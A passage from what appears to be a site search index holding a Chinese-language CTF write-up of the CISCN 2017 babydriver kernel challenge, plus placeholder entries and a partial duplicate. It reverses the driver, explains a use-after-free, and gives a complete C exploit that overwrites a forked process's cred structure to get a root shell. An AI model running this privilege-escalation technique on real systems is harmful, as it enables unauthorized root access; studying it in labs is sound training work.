jojo"},{"location":"kernel/0ctf2018_babykernel_double_fetch/","text":"waiting","title":"0CTF2018 babykernel(DF)"},{"location":"kernel/0ctf2018_babykernel_double_fetch/#waiting","text":"","title":"waiting"},{"location":"kernel/BPF_IntOF/","text":"waiting","title":"RW BPF(Integer Overflow)"},{"location":"kernel/BPF_IntOF/#waiting","text":"","title":"waiting"},{"location":"kernel/ciscn_2017_babydriver_ROP_bypass_smep/","text":"waiting","title":"CISCN2017 babydriver(ROP)"},{"location":"kernel/ciscn_2017_babydriver_ROP_bypass_smep/#waiting","text":"","title":"waiting"},{"location":"kernel/ciscn_2017_babydriver_UAF/","text":"CISCN 2017 babydriver (UAF\u5229\u7528\u65b9\u6cd5) \u9898\u76ee\u94fe\u63a5: https://github.com/beafb1b1/challenges/tree/master/kernel/CISCN_2017_babydriver \u524d\u7f6e\u64cd\u4f5c \u9898\u76ee\u7ed9\u4e86 boot.sh , bzImage \u548c rootfs.cpio \u4e09\u4e2a\u6587\u4ef6\u9996\u5148\u89c2\u5bdf boot.sh \uff0c\u4e5f\u5c31\u662f\u9898\u76ee\u542f\u52a8\u811a\u672c: #!/bin/bash qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append console=ttyS0 root=/dev/ram oops=panic panic=1 -enable-kvm -monitor /dev/null -m 64M --nographic -smp cores = 1 ,threads = 1 -cpu kvm64,+smep \u9898\u76ee\u4f7f\u7528 rootfs.cpio \u4f5c\u4e3a\u6587\u4ef6\u7cfb\u7edf\uff0c bzImage \u4f5c\u4e3a\u5185\u6838\uff0c\u4f7f\u7528qemu\u8fdb\u884c\u6a21\u62df\uff0c\u5e76\u4e14\u5f00\u542f\u4e86smep\u3002\u56e0\u4e3a\u6ca1\u6709\u7ed9ko\u6587\u4ef6\uff0c\u6240\u4ee5\u6211\u4eec\u9996\u5148\u5bf9rootfs.cpio\u6587\u4ef6\u8fdb\u884c\u89e3\u538b\uff1a tar -xf babydriver.tar mv rootfs.cpio rootfs.cpio.gz mkdir rootfs mv rootfs.cpio.gz ./rootfs/ cd rootfs gunzip ./rootfs.cpio.gz cpio -idmv rootfs.cpio \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5982\u4e0b\u76ee\u5f55\uff1a \u279c rootfs ls bin etc home init lib linuxrc proc rootfs.cpio sbin sys tmp usr \u5206\u6790\u4e0binit\u6587\u4ef6\uff1a #!/bin/sh mount -t proc none /proc mount -t sysfs none /sys mount -t devtmpfs devtmpfs /dev chown root:root flag chmod 400 flag exec 0 /dev/console exec 1 /dev/console exec 2 /dev/console insmod /lib/modules/4.4.72/babydriver.ko chmod 777 /dev/babydev echo -e \\nBoot took $( cut -d -f1 /proc/uptime ) seconds\\n setsid cttyhack setuidgid 1000 sh umount /proc umount /sys poweroff -d 0 -f flag\u6743\u9650\u8bbe\u7f6e\u4e3a\u4e86400\uff0c\u4e5f\u5c31\u662f\u53ea\u6709root\u624d\u80fd\u8bfb\u5230flag\u3002\u5e76\u5728\u6267\u884c\u4e86 insmod /lib/modules/4.4.72/babydriver.ko \uff0c\u6211\u4eec\u5728\u5bf9\u5e94\u76ee\u5f55\u627e\u5230ko\u6587\u4ef6\uff0c\u90a3\u4e48\u8fd9\u5c31\u662f\u9700\u8981\u8fdb\u884c\u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\u7684LKM\u4e86\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u5bf9\u8be5\u6587\u4ef6\u8fdb\u884c\u5206\u6790\u3002 LKM\u9006\u5411 \u9996\u5148\u8fdb\u884c checksec \uff1a \u279c rootfs checksec ./lib/modules/4.4.72/babydriver.ko [*] /home/b/Desktop/rootfs/lib/modules/4.4.72/babydriver.ko Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x0) PIE\u3001canary\u7b49\u90fd\u6ca1\u5f00\uff0c\u5e76\u4e14\u4fdd\u7559\u4e86\u7b26\u53f7\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u4f7f\u7528IDA\u8fdb\u884c\u5206\u6790\uff0c\u56e0\u4e3a\u6709\u7b26\u53f7\u4fe1\u606f\uff0c\u6240\u4ee5\u9996\u5148\u6211\u4eec\u53bb\u627e\u7ed3\u6784\u4f53\uff0c\u4f7f\u7528 shift + F9 \u53ef\u4ee5\u770b\u5230\uff1a ...... 00000000 ; [ 00000001 BYTES . COLLAPSED STRUCT lock_class_key . PRESS CTRL - NUMPAD + TO EXPAND ] 00000000 ; [ 00000010 BYTES . COLLAPSED STRUCT babydevice_t . PRESS CTRL - NUMPAD + TO EXPAND ] 00000000 ; [ 0000006 8 BYTES . COLLAPSED STRUCT cdev . PRESS CTRL - NUMPAD + TO EXPAND ] 00000000 ; [ 00000040 BYTES . COLLAPSED STRUCT kobject . PRESS CTRL - NUMPAD + TO EXPAND ] 00000000 ; [ 00000010 BYTES . COLLAPSED STRUCT list_head . PRESS CTRL - NUMPAD + TO EXPAND ] 00000000 ; [ 00000004 BYTES . COLLAPSED STRUCT kref . PRESS CTRL - NUMPAD + TO EXPAND ] 00000000 ; [ 00000004 BYTES . COLLAPSED STRUCT atomic_t . PRESS CTRL - NUMPAD + TO EXPAND ] 00000000 ; [ 000000 D8 BYTES . COLLAPSED STRUCT file_operations . PRESS CTRL - NUMPAD + TO EXPAND ] 00000000 ; [ 00000040 BYTES . COLLAPSED STRUCT modversion_info . PRESS CTRL - NUMPAD + TO EXPAND ] ...... \u8fd9\u91cc\u6709\u51e0\u4e2a\u7ed3\u6784\u4f53\u662f\u9700\u8981\u5206\u6790\u7684\uff0c\u9996\u5148\u662f file_operations \uff0c\u5c55\u5f00\u540e\u662f\u5982\u4e0b\u5185\u5bb9\uff1a 00000000 file_operations struc ; ( sizeof = 0xD8 , align = 0x8 , copyof_138 ) 00000000 ; XREF : . data : fops / r 00000000 owner dq ? ; offset 0000000 8 llseek dq ? ; offset 00000010 read dq ? ; offset 0000001 8 write dq ? ; offset 00000020 read_iter dq ? ; offset 0000002 8 write_iter dq ? ; offset 00000030 iterate dq ? ; offset 0000003 8 poll dq ? ; offset 00000040 unlocked_ioctl dq ? ; offset 0000004 8 compat_ioctl dq ? ; offset 00000050 mmap dq ? ; offset 0000005 8 open dq ? ; offset 00000060 flush dq ? ; offset 0000006 8 release dq ? ; offset 00000070 fsync dq ? ; offset 0000007 8 aio_fsync dq ? ; offset 000000 80 fasync dq ? ; offset 000000 88 lock dq ? ; offset 000000 90 sendpage dq ? ; offset 000000 98 get_unmapped_area dq ? ; offset 000000 A0 check_flags dq ? ; offset 000000 A8 flock dq ? ; offset 000000 B0 splice_write dq ? ; offset 000000 B8 splice_read dq ? ; offset 000000 C0 setlease dq ? ; offset 000000 C8 fallocate dq ? ; offset 000000 D0 show_fdinfo dq ? ; offset 000000 D8 file_operations ends \u8fd9\u4e2a\u7ed3\u6784\u4f53\u91cc\u4f1a\u8bb0\u5f55\u5bf9\u8bbe\u5907\u7684\u6587\u4ef6\u64cd\u4f5c\u88ab\u91cd\u5b9a\u5411\u5230\u4e86\u4ec0\u4e48\u51fd\u6570\uff0c\u8fd9\u91cc\u53ef\u4ee5xref\u4e00\u4e0b\uff0c\u53ef\u4ee5\u770b\u5230init\u51fd\u6570babydriver_init()\u4e2d\u7684\u4e00\u4e2a\u51fd\u6570\uff0c\u5185\u5bb9\u4e3a\uff1a cdev_init( cdev_0, fops); \u5176\u4e2d fops\u662f\u4e00\u4e2afile_operations\u7ed3\u6784\u4f53\u7684\u5b9e\u4f8b\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a ```cpp= .data:00000000000008C0 ; file_operations fops .data:00000000000008C0 fops file_operations .data:00000000000008C0 _data ends \u901a\u8fc7\u5bf9\u6bd4\u53ef\u4ee5\u77e5\u9053\u5bf9\u8bbe\u5907\u6587\u4ef6\u7684\u64cd\u4f5c\u4f1a\u901a\u8fc7\u5982\u4e0b\u51fd\u6570\u8fdb\u884c\u5904\u7406\uff08\u6ce8\u610f\u8fd9\u91ccIDA\u663e\u793a\u7684\u6709\u4e9b\u95ee\u9898\uff0crelease\u5176\u5b9e\u5bf9\u5e94\u7684\u662fbabyrelease\uff09\uff1a * open: babyopen * read: babyread * write: babywrite * ioctl: babyioctl * release: babyrelease \u7b2c\u4e8c\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u7ed3\u6784\u4f53\u662fbabydevice_t ```cpp 00000000 babydevice_t struc ; (sizeof=0x10, align=0x8, copyof_429) 00000000 ; XREF: .bss:babydev_struct/r 00000000 device_buf dq ? ; XREF: babyrelease+6/r 00000000 ; babyopen+26/w ... ; offset 00000008 device_buf_len dq ? ; XREF: babyopen+2D/w 00000008 ; babyioctl+3C/w ... 00000010 babydevice_t ends \u8be5\u7ed3\u6784\u4f53\u4e00\u5171 0x10 \u4e2a\u5b57\u8282\uff0c\u5176\u4e2d\u524d8\u4e2a\u5b57\u8282\u662f device_buf \uff0c\u540e2\u4e2a\u5b57\u8282\u662f bevice_buf_len \u3002\u63a5\u4e0b\u6765\u6211\u4eec\u5bf9\u7a0b\u5e8f\u4e2d\u7684\u51fd\u6570\u8fdb\u884c\u5206\u6790\u3002 babyopen \u5728\u8bbe\u5907\u6587\u4ef6\u6253\u5f00\u65f6\u4f1a\u6267\u884cbabyopen\u51fd\u6570\uff0cbabyopen\u51fd\u6570\u5982\u4e0b\uff1a int __fastcall babyopen ( inode * inode , file * filp ) { __int64 v2 ; // rdx _fentry__ ( inode , filp ); babydev_struct . device_buf = ( char * ) kmem_cache_alloc_trace ( kmalloc_caches [ 6 ], 37748928LL , 64LL ); babydev_struct . device_buf_len = 64LL ; printk ( device open \\n , 37748928LL , v2 ); return 0 ; } \u6bcf\u6b21open\u7684\u65f6\u5019\u90fd\u4f1a\u901a\u8fc7kmalloc\u7533\u8bf7\u4e00\u575764\u5b57\u8282\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u5e76\u628a\u6307\u9488\u5b58\u50a8\u5728bss\u4e0a\u7684\u5168\u5c40\u53d8\u91cfbabydev_struct\u4e2d\uff0c\u540c\u65f6\u66f4\u65b0babydev_struct\u7684device_buf_len\u4e3a64\u3002 babyread \u5728\u5bf9\u6253\u5f00\u7684\u8bbe\u5907\u8fdb\u884cread\u64cd\u4f5c\u65f6\u4f1a\u6267\u884cbabyread\u51fd\u6570\uff0cbabyread\u51fd\u6570\u5982\u4e0b\uff1a ssize_t __fastcall babyread ( file * filp , char * buffer , size_t length , loff_t * offset ) { size_t v4 ; // rdx ssize_t result ; // rax ssize_t v6 ; // rbx _fentry__ ( filp , buffer ); if ( ! babydev_struct . device_buf ) return - 1LL ; result = - 2LL ; if ( babydev_struct . device_buf_len v4 ) { v6 = v4 ; copy_to_user ( buffer ); result = v6 ; } return result ; } \u8be5\u51fd\u6570\u9996\u5148\u68c0\u67e5\u4e86 babydev_struct \u7684 device_buf_len \u662f\u5426\u6bd4\u8981\u8bfb\u7684\u957f\u5ea6\u5927\uff0c\u6ee1\u8db3\u6761\u4ef6\u7684\u8bdd\uff0c\u5c31\u628a babydev_struct.device_buf \u6307\u5411\u7684\u6570\u636e\u62f7\u8d1d\u5230buffer \u4e2d\uff0cbuffer\u548c\u957f\u5ea6\u90fd\u662f\u7528\u6237\u4f20\u9012\u7684\u53c2\u6570\uff0c\u5176\u4e2dbuffer\u662f\u7528\u6237\u6001\u7684\u5730\u5740\u3002 babywrite \u5728\u5bf9\u8bbe\u5907\u6587\u4ef6\u8fdb\u884cwrite\u64cd\u4f5c\u65f6\uff0c\u4f1a\u6267\u884cbabywrite\u51fd\u6570\uff0c\u51fd\u6570\u5185\u5bb9\u5982\u4e0b\uff1a ssize_t __fastcall babywrite ( file * filp , const char * buffer , size_t length , loff_t * offset ) { size_t v4 ; // rdx ssize_t result ; // rax ssize_t v6 ; // rbx _fentry__ ( filp , buffer ); if ( ! babydev_struct . device_buf ) return - 1LL ; result = - 2LL ; if ( babydev_struct . device_buf_len v4 ) { v6 = v4 ; copy_from_user ( babydev_struct . device_buf , ( void * ) buffer , ( void * ) v4 ); result = v6 ; } return result ; } \u9996\u5148\u68c0\u67e5\u4f20\u5165\u7684\u957f\u5ea6\u662f\u5426\u6ee1\u8db3\u5c0f\u4e8e device_buf_len ,\u7136\u540e\u5c06\u7528\u6237\u6001buffer\u4e2d\u7684\u5185\u5bb9\u62f7\u8d1d\u5230 babydev_struct.device_buf \u6307\u5411\u7684\u7a7a\u95f4\u3002 babyioctl __int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg) { size_t v3; // rdx size_t v4; // rbx __int64 v5; // rdx __int64 result; // rax _fentry__(filp, *(_QWORD *) command); v4 = v3; if ( command == 0x10001 ) { kfree(babydev_struct.device_buf); babydev_struct.device_buf = (char *)_kmalloc(v4, 37748928LL); babydev_struct.device_buf_len = v4; printk( alloc done\\n , 37748928LL, v5); result = 0LL; } else { printk( unk_2EB, v3, v3); result = -22LL; } return result; } \u5b9a\u4e49\u4e86 0x10001 \u7684\u547d\u4ee4\uff0c\u7528\u6237\u6001\u53ef\u4ee5\u901a\u8fc7ioctl\u8fdb\u884c\u4ea4\u4e92\uff0c\u8be5\u51fd\u6570\u9996\u5148\u91ca\u653e\u4e86 babydev_struct.device_buf \u6307\u5411\u7684\u5185\u5b58\uff0c\u518d\u6839\u636e\u7528\u6237\u4f20\u9012\u7684\u53c2\u6570\u91cd\u65b0\u7533\u8bf7\u4e86\u4e00\u5757\u5185\u5b58\uff0c\u5e76\u628a\u957f\u5ea6\u8d4b\u503c\u7ed9 babydev_struct.device_buf_len \u3002 babyrelease int __fastcall babyrelease ( inode * inode , file * filp ) { __int64 v2 ; // rdx _fentry__ ( inode , filp ); kfree ( babydev_struct . device_buf ); printk ( device release \\n , filp , v2 ); return 0 ; } \u5173\u95ed\u8bbe\u5907\u6587\u4ef6\u7684\u65f6\u5019\u4f1a\u91ca\u653e babydev_struct.device_buf \u3002 \u6f0f\u6d1e\u5229\u7528 \u8fd9\u91cc\u5b58\u5728\u4e00\u4e2aUAF\u6f0f\u6d1e\uff0cbabydev_struct\u662f\u5168\u5c40\u53d8\u91cf\uff0c\u5982\u679c\u6211\u4eecopen\u8bbe\u5907\u4e24\u6b21\uff0c\u90a3\u4e48\u7b2c\u4e8c\u6b21open\u7684\u65f6\u5019\u5c31\u4f1a\u8986\u76d6\u7b2c\u4e00\u6b21open\u7684babydev_struct\uff0c\u6b64\u65f6free\u6389\u7b2c\u4e00\u4e2a\uff0c\u7b2c\u4e8c\u4e2a\u6307\u5411\u7684\u5c31\u662ffree\u540e\u7684\uff0c\u56e0\u6b64\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2aUAF\u3002 \u8fd9\u91cc\u8003\u8651\u7684\u4e00\u79cd\u7b80\u5355\u7684\u5229\u7528\u65b9\u6cd5\u5229\u7528UAF\u53bb\u4fee\u6539\u65b0\u8fdb\u7a0b\u7684CRED\u7ed3\u6784\uff0c\u4ece\u800c\u6253\u6210\u6743\u9650\u63d0\u5347\u7684\u6548\u679c\u3002\u9996\u5148\u6211\u4eec\u770b\u4e00\u4e0b\u8be5\u5185\u6838\u7248\u672c\u7684CRED\u7ed3\u6784\uff1a struct cred { atomic_t usage ; #ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers ; /* number of processes subscribed */ void * put_addr ; unsigned magic ; #define CRED_MAGIC 0x43736564 #define CRED_MAGIC_DEAD 0x44656144 #endif kuid_t uid ; /* real UID of the task */ kgid_t gid ; /* real GID of the task */ kuid_t suid ; /* saved UID of the task */ kgid_t sgid ; /* saved GID of the task */ kuid_t euid ; /* effective UID of the task */ kgid_t egid ; /* effective GID of the task */ kuid_t fsuid ; /* UID for VFS ops */ kgid_t fsgid ; /* GID for VFS ops */ unsigned securebits ; /* SUID-less security management */ kernel_cap_t cap_inheritable ; /* caps our children can inherit */ kernel_cap_t cap_permitted ; /* caps we re permitted */ kernel_cap_t cap_effective ; /* caps we can actually use */ kernel_cap_t cap_bset ; /* capability bounding set */ kernel_cap_t cap_ambient ; /* Ambient capability set */ #ifdef CONFIG_KEYS unsigned char jit_keyring ; /* default keyring to attach requested * keys to */ struct key __rcu * session_keyring ; /* keyring inherited over fork */ struct key * process_keyring ; /* keyring private to this process */ struct key * thread_keyring ; /* keyring private to this thread */ struct key * request_key_auth ; /* assumed request_key authority */ #endif #ifdef CONFIG_SECURITY void * security ; /* subjective LSM security */ #endif struct user_struct * user ; /* real user ID subscription */ struct user_namespace * user_ns ; /* user_ns the caps and keyrings are relative to. */ struct group_info * group_info ; /* supplementary groups for euid/fsgid */ struct rcu_head rcu ; /* RCU deletion hook */ }; \u5927\u5c0f\u4e3a0xa8\uff0c\u90a3\u4e48\u5229\u7528\u601d\u8def\u5c31\u5f88\u660e\u786e\u4e86\uff1a 1. \u9996\u5148\u6253\u5f00babydev\u4e24\u6b21\uff0c\u6b64\u65f6\u7b2c\u4e8c\u6b21\u7533\u8bf7\u7684\u5185\u5b58\u4f1a\u8986\u76d6\u7b2c\u4e00\u6b21\u7533\u8bf7\u7684\u5185\u5b58\u5730\u5740\uff1b 2. \u901a\u8fc7ioctl\u4fee\u6539\u5185\u5b58\u5927\u5c0f\u4e3a0xa8\uff0c\u4e5f\u5c31\u662fcred\u7684\u5927\u5c0f\uff1b 3. \u5173\u95ed\u7b2c\u4e00\u4e2a\u53e5\u67c4\uff0c\u6b64\u65f6\u4f1a\u6267\u884cbabyrelease\u51fd\u6570\uff0c\u5168\u5c40\u53d8\u91cf\u4e2d\u7684\u7ed3\u6784\u4f53\u6307\u5411\u76840xa8\u5927\u5c0f\u7684\u5185\u5b58\u4f1a\u88ab\u91ca\u653e\uff0c\u800c\u7b2c\u4e8c\u4e2a\u6587\u4ef6\u53e5\u67c4\u4f9d\u7136\u5b58\u5728\uff0c\u56e0\u6b64\u6211\u4eec\u83b7\u5f97\u4e86\u4e00\u4e2a\u60ac\u5782\u6307\u9488\uff08\u6307\u5411\u88ab\u91ca\u653e\u7684\u5185\u5b58\uff09\uff1b 4. \u8fd9\u65f6fork\u4e00\u4e2a\u65b0\u7684\u8fdb\u7a0b\uff0c\u65b0\u8fdb\u7a0b\u7684cred\u6b63\u597d\u7533\u8bf7\u5728\u6211\u4eec\u91ca\u653e\u7684\u4f4d\u7f6e\uff1b 5. \u901a\u8fc7\u60ac\u5782\u6307\u9488\u6211\u4eec\u53ef\u4ee5write\u65b0\u8fdb\u7a0bcred\u4e2d\u7684\u5185\u5bb9\uff0c\u4ece\u800c\u5b9e\u73b0\u65b0\u8fdb\u7a0b\u7684\u6743\u9650\u63d0\u5347\u3002 \u4e0b\u9762\u7f16\u5199UAF\u7684\u5229\u7528\u7a0b\u5e8f\uff1a #include stdio.h #include stdlib.h #include unistd.h #include fcntl.h #include stropts.h #include sys/wait.h #include sys/stat.h int main () { // \u6253\u5f00\u4e24\u6b21\u8bbe\u5907 int fd1 = open ( /dev/babydev , 2 ); int fd2 = open ( /dev/babydev , 2 ); // \u4fee\u6539 babydev_struct.device_buf_len \u4e3a sizeof(struct cred) ioctl ( fd1 , 0x10001 , 0xa8 ); // \u91ca\u653e fd1 close ( fd1 ); // \u65b0\u8d77\u8fdb\u7a0b\u7684 cred \u7a7a\u95f4\u4f1a\u548c\u521a\u521a\u91ca\u653e\u7684 babydev_struct \u91cd\u53e0 int pid = fork (); if ( pid 0 ) { puts ( [*] fork error! ); exit ( 0 ); } else if ( pid == 0 ) { // \u901a\u8fc7\u66f4\u6539 fd2\uff0c\u4fee\u6539\u65b0\u8fdb\u7a0b\u7684 cred \u7684 uid\uff0cgid \u7b49\u503c\u4e3a0 char zeros [ 30 ] = { 0 }; write ( fd2 , zeros , 28 ); if ( getuid () == 0 ) { puts ( [+] root now. ); system ( /bin/sh ); exit ( 0 ); } } else { wait ( NULL ); } close ( fd2 ); return 0 ; } \u6211\u4eec\u5bf9exp\u8fdb\u884c\u7f16\u8bd1\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u9898\u76ee\u7684kernel\u91cc\u9762\u6ca1\u6709libc\uff0c\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u9759\u6001\u7f16\u8bd1exp: \u279c Desktop gcc exp.c -static -o exploit \u279c Desktop file exploit exploit: ELF 64 -bit LSB executable, x86-64, version 1 ( GNU/Linux ) , statically linked, for GNU/Linux 3 .2.0, BuildID [ sha1 ]= b4df5ea181b300281f32a5e9a974ccd2f24f2ee3, not stripped \u56e0\u4e3a\u6211\u4eec\u662f\u672c\u5730\u8c03\u8bd5\uff0c\u6240\u4ee5\u53ef\u4ee5\u5c06exp\u76f4\u63a5\u653e\u5165\u5230rootfs\u76ee\u5f55\u4e2d\u5e76\u91cd\u65b0\u6253\u5305\uff1a \u279c Desktop cp exploit ./rootfs/home/ctf/ \u279c Desktop cd rootfs \u279c rootfs find . | cpio -o --format = newc ../rootfs.cpio 7216 blocks \u63a5\u4e0b\u6765\u76f4\u63a5\u8fd0\u884c\u5e76\u6267\u884cexp\u5c31\u53ef\u4ee5\u62ff\u5230root\u6743\u9650\uff1a / $ cd /home/ctf ~ $ ls exploit ~ $ ./exploit [ 22 .269245 ] device open [ 22 .270112 ] device open [ 22 .271025 ] alloc done [ 22 .271863 ] device release [ + ] root now. /home/ctf # id uid = 0 ( root ) gid = 0 ( root ) groups = 1000 ( ctf ) \u5ef6\u7533 \u5728\u65b0\u7248\u672c\u7684\u5185\u6838\u4e2d\u8fd9\u79cd\u653b\u51fb\u65b9\u5f0f\u65e0\u6548\u4e86\uff0c\u56e0\u4e3a\u65b0\u8fdb\u7a0b\u7684cred\u7ed3\u6784\u4f53\u4f1a\u6709\u4e00\u4e2a\u5355\u72ec\u7684\u533a\u57df\u8fdb\u884c\u7533\u8bf7\uff0c\u56e0\u6b64UAF\u6f0f\u6d1e\u65e0\u6cd5\u5229\u7528\u6210\u529f\uff0c\u8fd9\u79cd\u65b0\u7684\u7279\u5f81\u53eb\u505alockdown\uff0c\u8be6\u7ec6\u53ef\u4ee5\u53c2\u8003\uff1a lockdown \u5982\u4f55\u8c03\u8bd5 \u6211\u4eec\u8c03\u8bd5\u4e00\u4e0b\uff0c\u4ece\u5185\u6838\u7684bzImage\u6587\u4ef6\u4e2d\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u811a\u672c\u63d0\u53d6\u51fa\u5185\u6838\u7b26\u53f7\u6587\u4ef6vmlinux: /usr/src/linux-headers- $( uname -r ) /scripts/extract-vmlinux \u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b\uff1a \u279c Desktop /usr/src/linux-headers-4.15.0-54/scripts/extract-vmlinux bzImage vmlinux \u279c Desktop file vmlinux vmlinux: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , statically linked, BuildID [ sha1 ]= e993ea9809ee28d059537a0d5e866794f27e33b4, stripped \u63a5\u4e0b\u6765\u4fee\u6539\u4e00\u4e0b\u542f\u52a8\u811a\u672c\uff0c\u9996\u5148\u9700\u8981\u5728\u542f\u52a8\u547d\u4ee4\u540e\u6dfb\u52a0 -gdb tcp::1234 -S \u3002 #!/bin/bash qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append console=ttyS0 root=/dev/ram oops=panic panic=1 -enable-kvm -monitor /dev/null -m 64M --nographic -smp cores = 1 ,threads = 1 -cpu kvm64,+smep -gdb tcp::1234 -S \u7136\u540e\u8fd0\u884c\u542f\u52a8\u811a\u672c\uff0c\u8fd9\u65f6\u865a\u62df\u673a\u4f1a\u505c\u7b49\u5f85gdb\u8fde\u63a5\u3002\u4f7f\u7528 gdb ./vmlinux \u542f\u52a8gdb\uff0c\u5e76\u8fdc\u7a0b\u8fde\u63a5\u5230qemu\uff0c\u6267\u884cc\uff0c\u8ba9\u865a\u62df\u673a\u7ee7\u7eed\u8fd0\u884c: gdb ./vmlinux ... pwndbg target remote localhost:1234 pwndbg c \u865a\u62df\u673a\u8fd0\u884c\u540e\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u65b9\u5f0f\u6765\u770bko\u6587\u4ef6.text\u6bb5\u7684\u5730\u5740\uff1a / $ cat /sys/module/babydriver/sections/.text 0xffffffffc0000000 \u63a5\u4e0b\u6765\u52a0\u5165ko\u6587\u4ef6\u7684\u7b26\u53f7\u8868\uff0c\u5728gdb\u4e2d\u8fd0\u884c add-symbol-file core.ko textaddr \u5373\u53ef\uff1a pwndbg add-symbol-file babydriver.ko 0xffffffffc0000000 add symbol table from file babydriver.ko at .text_addr = 0xffffffffc0000000 Reading symbols from babydriver.ko...done. \u7136\u540e\u5c31\u53ef\u4ee5\u8c03\u8bd5\u4e86\uff0c\u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5b\u51fd\u6570\u540d\uff08\u56e0\u4e3ako\u6587\u4ef6\u91cc\u9762\u5e26\u6709\u7b26\u53f7\u8868\uff09\uff1a pwndbg b babyopen Breakpoint 1 at 0xffffffffc0000030: file /home/atum/PWN/my/babydriver/kernelmodule/babydriver.c, line 28. pwndbg c Continuing. \u6b64\u65f6\u6211\u4eec\u518d\u8fd0\u884cexp\u4eec\u5c31\u4f1a\u6210\u529f\u65ad\u5230babyopen\u3002\u5982\u679c\u6ca1\u6709\u7b26\u53f7\u4fe1\u606f\u7684\u8bdd\uff0c\u5c31\u53ea\u80fd\u8ba1\u7b97\u5730\u5740\u76f4\u63a5b\u3002","title":"CISCN2017 babydriver(UAF)"},{"location":"kernel/ciscn_2017_babydriver_UAF/#ciscn-2017-babydriver-uaf","text":"\u9898\u76ee\u94fe\u63a5: https://github.com/beafb1b1/challenges/tree/master/kernel/CISCN_2017_babydriver","title":"CISCN 2017 babydriver (UAF\u5229\u7528\u65b9\u6cd5)"},{"location":"kernel/ciscn_2017_babydriver_UAF/#_1","text":"\u9898\u76ee\u7ed9\u4e86 boot.sh , bzImage \u548c rootfs.cpio \u4e09\u4e2a\u6587\u4ef6\u9996\u5148\u89c2\u5bdf boot.sh \uff0c\u4e5f\u5c31\u662f\u9898\u76ee\u542f\u52a8\u811a\u672c: #!/bin/bash qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append console=ttyS0 root=/dev/ram oops=panic panic=1 -enable-kvm -monitor /dev/null -m 64M --nographic -smp cores = 1 ,threads = 1 -cpu kvm64,+smep \u9898\u76ee\u4f7f\u7528 rootfs.cpio \u4f5c\u4e3a\u6587\u4ef6\u7cfb\u7edf\uff0c bzImage \u4f5c\u4e3a\u5185\u6838\uff0c\u4f7f\u7528qemu\u8fdb\u884c\u6a21\u62df\uff0c\u5e76\u4e14\u5f00\u542f\u4e86smep\u3002\u56e0\u4e3a\u6ca1\u6709\u7ed9ko\u6587\u4ef6\uff0c\u6240\u4ee5\u6211\u4eec\u9996\u5148\u5bf9rootfs.cpio\u6587\u4ef6\u8fdb\u884c\u89e3\u538b\uff1a tar -xf babydriver.tar mv rootfs.cpio rootfs.cpio.gz mkdir rootfs mv rootfs.cpio.gz ./rootfs/ cd rootfs gunzip ./rootfs.cpio.gz cpio -idmv rootfs.cpio \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5982\u4e0b\u76ee\u5f55\uff1a \u279c rootfs ls bin etc home init lib linuxrc proc rootfs.cpio sbin sys tmp usr \u5206\u6790\u4e0binit\u6587\u4ef6\uff1a #!/bin/sh mount -t proc none /proc mount -t sysfs none /sys mount -t devtmpfs devtmpfs /dev chown root:root flag chmod 400 flag exec 0 /dev/console exec 1 /dev/console exec 2 /dev/console insmod /lib/modules/4.4.72/babydriver.ko chmod 777 /dev/babydev echo -e \\nBoot took $( cut -d -f1 /proc/uptime ) seconds\\n setsid cttyhack setuidgid 1000 sh umount /proc umount /sys poweroff -d 0 -f flag\u6743\u9650\u8bbe\u7f6e\u4e3a\u4e86400\uff0c\u4e5f\u5c31\u662f\u53ea\u6709root\u624d\u80fd\u8bfb\u5230flag\u3002\u5e76\u5728\u6267\u884c\u4e86 insmod /lib/modules/4.4.72/babydriver.ko \uff0c\u6211\u4eec\u5728\u5bf9\u5e94\u76ee\u5f55\u627e\u5230ko\u6587\u4ef6\uff0c\u90a3\u4e48\u8fd9\u5c31\u662f\u9700\u8981\u8fdb\u884c\u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\u7684LKM\u4e86\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u5bf9\u8be5\u6587\u4ef6\u8fdb\u884c\u5206\u6790\u3002","title":"\u524d\u7f6e\u64cd\u4f5c"},{"location":"kernel/ciscn_2017_babydriver_UAF/#lkm","text":"\u9996\u5148\u8fdb\u884c checksec \uff1a \u279c rootfs checksec ./lib/modules/4.4.72/babydriver.ko [*] /home/b/Desktop/rootfs/lib/modules/4.4.72/babydriver.ko Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x0) PIE\u3001canary\u7b49\u90fd\u6ca1\u5f00\uff0c\u5e76\u4e14\u4fdd\u7559\u4e86\u7b26\u53f7\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u4f7f\u7528IDA\u8fdb\u884c\u5206\u6790\uff0c\u56e0\u4e3a\u6709\u7b26\u53f7\u4fe1\u606f\uff0c\u6240\u4ee5\u9996\u5148\u6211\u4eec\u53bb\u627e\u7ed3\u6784\u4f53\uff0c\u4f7f\u7528 shift + F9 \u53ef\u4ee5\u770b\u5230\uff1a ...... 00000000 ; [ 00000001 BYTES . COLLAPSED STRUCT lock_class_key . PRESS CTRL - NUMPAD + TO EXPAND ] 00000000 ; [ 00000010 BYTES . COLLAPSED STRUCT babydevice_t . PRESS CTRL - NUMPAD + TO EXPAND ] 00000000 ; 